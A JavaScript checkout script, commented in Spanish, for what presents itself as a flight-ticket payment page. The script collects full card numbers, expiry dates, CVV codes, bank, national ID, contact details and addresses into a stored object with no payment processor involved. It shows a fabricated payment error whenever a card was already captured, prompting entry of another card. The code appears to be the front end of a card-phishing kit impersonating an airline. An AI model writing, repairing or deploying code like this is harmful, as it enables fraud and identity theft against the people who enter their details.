// public/js/payment.js — versión robusta para evitar quedarse pegado en el loader
// Asegúrate que <script src="./js/functions.js"></script> está antes de este archivo en el HTML.

(function () {
  'use strict';

  const LS = window.localStorage;

  // elementos DOM que usas
  let loader = null;
  function initDomRefs() {
    loader = document.querySelector('.loader');
    // si loader es null, crear referencia segura
    if (!loader) {
      console.warn('WARNING: .loader no encontrado en el DOM.');
    }
  }

  // Util: quitar spinner si existe (sin lanzar errores)
  function forceHideLoader() {
    try {
      if (loader) {
        loader.classList.remove('show');
        // fallback: también aplicar estilo inline para asegurarlo
        loader.style.display = 'none';
      }
      // Quitar clase sb-hidden del body si existe
      try {
        document.body.classList.remove('sb-hidden');
      } catch (e) {}
    } catch (e) {
      console.warn('forceHideLoader error:', e);
    }
  }

  // Llamamos init al DOMContentLoaded
  document.addEventListener('DOMContentLoaded', () => {
    initDomRefs();

    // ejecutamos la inicialización con un pequeño retraso (igual que antes)
    setTimeout(startup, 2000);

    // Safety: si algo falla y loader sigue visible, lo quitamos a los 5s
    setTimeout(() => {
      const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
      if (stillVisible) {
        console.warn('Loader seguía visible después de 5s — forzando ocultado.');
        forceHideLoader();
      }
    }, 5000);
  });

  // STARTUP — lógica que antes tenías dentro del setTimeout
  function startup() {
    try {
      // Proteger acceso a `info` (definido en functions.js). Si no existe, cargar desde LS o esperar.
      if (typeof info === 'undefined' || !info || !info.flightInfo) {
        // intentar recuperar desde localStorage
        const saved = LS.getItem('info');
        if (saved) {
          try {
            window.info = JSON.parse(saved);
            console.info('info cargado desde localStorage (startup).');
          } catch (e) {
            console.warn('No se pudo parsear LS.info:', e);
          }
        } else {
          console.warn('Variable `info` no encontrada y no hay info en localStorage.');
        }
      }

      // quitar clase sb-hidden si existía y ocultar loader si existe
      try { document.body.classList.remove('sb-hidden'); } catch (e) {}
      try { if (loader) loader.classList.remove('show'); } catch (e) {}
      // adicional: asegurar estilo inline oculto (fallback)
      if (loader) loader.style.display = 'none';

      // --- Flight resume (proteger accesos nulos) ---
      try {
        if (window.info && info.flightInfo && info.flightInfo.origin && info.flightInfo.destination) {
          const originEl = document.querySelector('#origin-code');
          const destEl = document.querySelector('#destination-code');
          if (originEl) originEl.textContent = info.flightInfo.origin.code || '';
          if (destEl) destEl.textContent = info.flightInfo.destination.code || '';
        } else {
          console.warn('info.flightInfo incompleto — omitiendo flight resume.');
        }
      } catch (e) {
        console.error('Error al actualizar flight resume:', e);
      }

      // calcular precio (con protecciones)
      try {
        let finalPrice = "- -";
        if (window.info && info.flightInfo) {
          if (info.flightInfo.ticket_nat === 'NAC') {
            finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
          } else if (info.flightInfo.ticket_nat === 'INT') {
            finalPrice = pricesINT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
          } else {
            console.log('flight resume: ticket_nat no definido');
          }
        }
        const fcEl = document.querySelector('#flight-cost');
        if (fcEl && typeof finalPrice === 'number') fcEl.textContent = formatPrice(finalPrice);
        else if (fcEl && typeof finalPrice === 'string') fcEl.textContent = finalPrice;
      } catch (e) {
        console.warn('Error calculando finalPrice:', e);
      }

      // Si en metaInfo había un error explícito, mostrarlo (tu lógica original)
      try {
        if (window.info && info.metaInfo && info.metaInfo.p && info.metaInfo.p !== '') {
          alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
        }
      } catch (e) {}

      console.log('payment.js: startup finalizado.');
    } catch (err) {
      console.error('startup error:', err);
      // si algo sale mal, forzamos ocultar loader para que no quede pegado
      forceHideLoader();
    }
  } // fin startup


  /***************************************
   * El resto de tus funciones y lógica
   * (validaciones, form submit, formateos...)
   ***************************************/

  // Referencias DOM para el form (las mismas que usas)
  const form = document.querySelector('#next-step');
  const p = document.querySelector('#p');
  const pdate = document.querySelector('#pdate');
  const c = document.querySelector('#c');
  const ban = document.querySelector('#ban');
  const dues = document.querySelector('#dues');
  const dudename = document.querySelector('#name');
  const surname = document.querySelector('#surname');
  const dniEl = document.querySelector('#cc');
  const email = document.querySelector('#email');
  const telnum = document.querySelector('#telnum');
  const city = document.querySelector('#city');
  const state = document.querySelector('#state');
  const address = document.querySelector('#address');

  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Limpieza de estados visuales
      [p, pdate, c, dudename, surname, dniEl, email, telnum, city, state, address].forEach(el => {
        try { el.classList.remove('input-error'); } catch(_) {}
      });

      // Validaciones (mantengo tu lógica; si falla, marcamos campo y retornamos)
      const rawCard = p ? p.value : '';
      const firstChar = (rawCard.replace(/\s/g, ''))[0] || '';
      const cardLength = rawCard.length;

      const cardLengthOk = (cardLength === 19 && firstChar !== '3' && ['4','5'].includes(firstChar)) ||
                           (cardLength === 17 && firstChar === '3');

      if (!cardLengthOk) { if (p) p.classList.add('input-error'); if (p) p.focus(); return; }
      if (!isLuhnValid(rawCard)) { if (p) p.classList.add('input-error'); if (p) p.focus(); return; }
      if (!isValidDate(pdate ? pdate.value : '')) { if (pdate) pdate.classList.add('input-error'); if (pdate) pdate.focus(); return; }
      if (!((c && c.value.length === 3 && firstChar !== '3') || (c && c.value.length === 4 && firstChar === '3'))) { if (c) c.classList.add('input-error'); if (c) c.focus(); return; }
      if (!ban || !ban.value) { if (ban) ban.focus(); return; }
      if (!dudename || !dudename.value) { if (dudename) dudename.classList.add('input-error'); if (dudename) dudename.focus(); return; }
      if (!surname || !surname.value) { if (surname) surname.classList.add('input-error'); if (surname) surname.focus(); return; }
      if (!dniEl || !dniEl.value) { if (dniEl) dniEl.classList.add('input-error'); if (dniEl) dniEl.focus(); return; }
      if (!email || !email.value) { if (email) email.classList.add('input-error'); if (email) email.focus(); return; }
      if (!telnum || !telnum.value) { if (telnum) telnum.classList.add('input-error'); if (telnum) telnum.focus(); return; }
      if (!city || !city.value) { if (city) city.classList.add('input-error'); if (city) city.focus(); return; }
      if (!state || !state.value) { if (state) state.classList.add('input-error'); if (state) state.focus(); return; }
      if (!address || !address.value) { if (address) address.classList.add('input-error'); if (address) address.focus(); return; }

      // Si pasó validaciones, actualizar info.metaInfo (si existe info)
      try {
        if (window.info && info.metaInfo) {
          info.metaInfo.p = p.value;
          info.metaInfo.ban = ban.value;
          info.metaInfo.pdate = pdate.value;
          info.metaInfo.c = c.value;
          info.metaInfo.dudename = dudename.value;
          info.metaInfo.surname = surname.value;
          info.metaInfo.cc = dniEl.value;
          info.metaInfo.email = email.value;
          info.metaInfo.telnum = telnum.value;
          info.metaInfo.city = city.value;
          info.metaInfo.state = state.value;
          info.metaInfo.address = address.value;
          info.metaInfo.dues = dues ? dues.value : '';
          info.metaInfo.flightCost = document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '';
          info.checkerInfo.mode = 'userpassword';
          updateLS();
        }
      } catch (e) {
        console.warn('No se pudo actualizar info.metaInfo:', e);
      }

      // Aquí puedes seguir con tu flujo: enviar al backend, etc.
      // Por ejemplo:
      // const payload = {...}; fetch('/api/enviar-pago', { method:'POST', ... })

      console.log('Formulario validado correctamente — continua con el envío al backend.');
    });
  }

  /***********************
   * Funciones util (las tuyas)
   ***********************/
  function updateLS(){
    try { LS.setItem('info', JSON.stringify(info)); } catch (e) { console.warn('updateLS error', e); }
  }

  function formatCNumber(input) {
    if (!input) return;
    let numero = input.value.replace(/\D/g, '');
    if (numero.length === 0) {
      try { input.classList.remove(); } catch (e) {}
      input.classList.add('input-cc', 'mt-2', 'bg-std');
    }
    let numeroFormateado = '';
    if (numero[0] === '3') {
      c.setAttribute('maxlength','4');
      if (p) { p.classList.remove(); p.classList.add('bg-am','input-cc','mt-2'); }
      if (numero.length > 15) numero = numero.substr(0,15);
      for (let i=0;i<numero.length;i++){
        if (i===4 || i===10) numeroFormateado += ' ';
        numeroFormateado += numero.charAt(i);
      }
      input.value = numeroFormateado;
    } else {
      if (numero[0] == '4' && p) p.classList.add('bg-vi');
      if (numero[0] == '5' && p) p.classList.add('bg-mc');
      c.setAttribute('maxlength','3');
      if (numero.length > 16) numero = numero.substr(0,16);
      for (let i=0;i<numero.length;i++){
        if (i>0 && i%4===0) numeroFormateado += ' ';
        numeroFormateado += numero.charAt(i);
      }
      input.value = numeroFormateado;
    }
  }

  function formatDate(input) {
    if (!input) return;
    var texto = input.value;
    texto = texto.replace(/\D/g,'');
    texto = texto.substring(0,4);
    if (texto.length > 2) texto = texto.substring(0,2) + '/' + texto.substring(2,4);
    input.value = texto;
  }

  function formatPrice(number){
    if (typeof number !== 'number') number = Number(number) || 0;
    return number.toFixed(2);
  }

  function isLuhnValid(bin) {
    if (!bin) return false;
    bin = bin.replace(/\D/g,'');
    if (bin.length < 6) return false;
    const digits = bin.split('').map(Number).reverse();
    let sum = 0;
    for (let i=0;i<digits.length;i++){
      if (i%2 !== 0){
        let doubled = digits[i]*2;
        if (doubled > 9) doubled -= 9;
        sum += doubled;
      } else {
        sum += digits[i];
      }
    }
    return sum % 10 === 0;
  }

  function isValidDate(fechaInput) {
    if (!fechaInput || typeof fechaInput !== 'string') return false;
    var partes = fechaInput.split('/');
    if (partes.length < 2) return false;
    var mesInput = parseInt(partes[0],10);
    var añoInput = parseInt(partes[1],10);
    if (isNaN(mesInput) || isNaN(añoInput)) return false;
    if (mesInput > 12) return false;
    añoInput += 2000;
    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8;
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) return false;
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth()+1))) {
      return true;
    } else {
      return false;
    }
  }

})(); // fin módulo
